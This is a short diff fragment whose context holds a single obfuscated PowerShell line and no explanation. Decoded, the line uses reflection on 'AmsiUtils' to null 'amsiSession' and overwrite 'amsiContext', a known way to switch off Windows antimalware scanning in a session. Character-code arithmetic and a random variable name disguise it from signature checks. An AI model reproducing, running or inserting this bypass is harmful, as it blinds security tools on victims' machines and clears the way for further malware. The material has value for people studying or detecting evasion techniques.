@@ -1,4 +1,5 @@
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 $TZTTGYMX=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((11333-2257));[Ref].Assembly.GetType("System.Management.Automation.$([ChAr](65)+[Char]([BYte]0x6D)+[ChAR](44+71)+[ChAr]([bytE]0x69))Utils").GetField("$([Char]([ByTe]0x61)+[cHaR]([ByTe]0x6D)+[cHAR](2760/24)+[char](27+78))Session", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([ChAr](65)+[Char]([BYte]0x6D)+[ChAR](44+71)+[ChAr]([bytE]0x69))Utils").GetField("$([Char]([ByTe]0x61)+[cHaR]([ByTe]0x6D)+[cHAR](2760/24)+[char](27+78))Context", "NonPublic,Static").SetValue($null, [IntPtr]$TZTTGYMX);
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
